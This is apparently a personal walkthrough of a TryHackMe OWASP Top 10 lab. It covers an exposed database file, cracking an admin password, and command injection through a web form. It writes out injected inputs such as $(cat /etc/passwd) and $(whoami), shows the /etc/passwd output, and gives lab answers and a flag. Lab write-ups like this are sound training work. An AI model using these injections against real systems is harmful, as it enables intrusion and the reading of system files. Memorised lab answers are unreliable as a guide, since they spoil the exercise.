# TryHackMe-OWASP-Top-10

## Broken Access Control
Nothing Special was there, read an article about Broken Access Control how it works.

![Broken access control](https://github.com/user-attachments/assets/3e1ec8bf-14cb-453e-a733-fb2e9181475a)

## Cryptographic Failures
This is the web site, i have to find every answer from this web site. Let's dive here.....

![image](https://github.com/user-attachments/assets/f11cb18d-2782-4ed7-8e11-adaeff157450)

To find out first answer we have to look into the web site. They have give us a hint where to look!

![image](https://github.com/user-attachments/assets/b6593812-839f-4ac2-bfc0-d4c08459eb20)

After spending some time i found this:

![image](https://github.com/user-attachments/assets/137f8311-f4c5-46cd-9689-8a5fc66bf692)

"http://10.10.63.235:81/assets/" Assets leads us to our destination and we found the first answer of our questions.

![image](https://github.com/user-attachments/assets/d72fe275-95d4-4295-8be1-0f76070a2d80)

- What is the name of the mentioned directory?
  Ans: /assets
- Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
  Ans: webapp.db
- Use the supporting material to access the sensitive data. What is the password hash of the admin user?

![image](https://github.com/user-attachments/assets/9ca97d7b-f9d9-4fca-b1e6-8fcbc4b889ad)

- What is the admin's plaintext password?

![image](https://github.com/user-attachments/assets/06e8ab69-803b-4408-b1a8-e1e8fb68c225)

- Log in as the admin. What is the flag?
 Ans: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Command Injection

- What strange text file is in the website's root directory?
Use "$(ls)" command on the "Enter your inner cow's moowing"

![image](https://github.com/user-attachments/assets/9a75fffa-1535-44bb-8290-a9f454c8b999)

- How many non-root/non-service/non-daemon users are there?
- Ans: 0
- Command: $(cat /etc/passwd)
 _________________________________________ 
/ root:x:0:0:root:/root:/bin/ash          \
| bin:x:1:1:bin:/bin:/sbin/nologin        |
| daemon:x:2:2:daemon:/sbin:/sbin/nologin |
| adm:x:3:4:adm:/var/adm:/sbin/nologin    |
| lp:x:4:7:lp:/var/spool/lpd:/sbin/nologi |
| n sync:x:5:0:sync:/sbin:/bin/sync       |
| shutdown:x:6:0:shutdown:/sbin:/sbin/shu |
| tdown halt:x:7:0:halt:/sbin:/sbin/halt  |
| mail:x:8:12:mail:/var/mail:/sbin/nologi |
| n                                       |
| news:x:9:13:news:/usr/lib/news:/sbin/no |
| login                                   |
| uucp:x:10:14:uucp:/var/spool/uucppublic |
| :/sbin/nologin                          |
| operator:x:11:0:operator:/root:/sbin/no |
| login                                   |
| man:x:13:15:man:/usr/man:/sbin/nologin  |
| postmaster:x:14:12:postmaster:/var/mail |
| :/sbin/nologin                          |
| cron:x:16:16:cron:/var/spool/cron:/sbin |
| /nologin                                |
| ftp:x:21:21::/var/lib/ftp:/sbin/nologin |
| sshd:x:22:22:sshd:/dev/null:/sbin/nolog |
| in                                      |
| at:x:25:25:at:/var/spool/cron/atjobs:/s |
| bin/nologin                             |
| squid:x:31:31:Squid:/var/cache/squid:/s |
| bin/nologin xfs:x:33:33:X Font          |
| Server:/etc/X11/fs:/sbin/nologin        |
| games:x:35:35:games:/usr/games:/sbin/no |
| login                                   |
| cyrus:x:85:12::/usr/cyrus:/sbin/nologin |
| vpopmail:x:89:89::/var/vpopmail:/sbin/n |
| ologin                                  |
| ntp:x:123:123:NTP:/var/empty:/sbin/nolo |
| gin                                     |
| smmsp:x:209:209:smmsp:/var/spool/mqueue |
| :/sbin/nologin                          |
| guest:x:405:100:guest:/dev/null:/sbin/n |
| ologin                                  |
| nobody:x:65534:65534:nobody:/:/sbin/nol |
| ogin                                    |
| apache:x:100:101:apache:/var/www:/sbin/ |
\ nologin                                 /
 ----------------------------------------- 

- What user is this app running as?
- $(whoami)

![image](https://github.com/user-attachments/assets/32d73958-83ec-4bb8-8dcd-682ff23f034a)

- What is the user's shell set as?
- Command: $(cat /etc/passwd)
- Ans : /sbin/nologin

- What version of Alpine Linux is running?

![image](https://github.com/user-attachments/assets/3aa150f3-d1f4-4769-833a-414f84fc2706)


